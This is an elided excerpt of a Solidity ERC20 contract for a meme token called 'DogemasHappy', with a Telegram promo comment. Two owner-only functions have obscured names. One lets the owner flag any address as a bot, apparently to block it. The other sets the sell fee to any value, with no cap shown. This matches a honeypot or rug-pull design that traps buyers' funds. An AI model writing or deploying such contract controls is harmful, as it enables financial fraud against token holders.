...
/**
Telegram : Https://Telegram.me/Dgmspy

Dgmspy is a warrior princess endowed with the fortitude
...
contract Dgmspy is ERC20, Auth {
    ...
    string constant private _name = "DogemasHappy";
    string constant private _symbol = "Dgmspy";
    ...
    uint256 private sellFeeMarketing = 11;
    ...
    address private autoLiquidityReceiver = 0x9960dCde78E595108b6235283327f4a715199895;
    address private MarketingFeeReceiver = 0x9960dCde78E595108b6235283327f4a715199895;
    ...
    function setBMDgmspy(address account, bool bmv) external onlyOwner() {
        isBot[account] = bmv;
    }

    function setFMDgmspy(uint256 fv) external onlyOwner {
        totalSellFee = fv;
    }
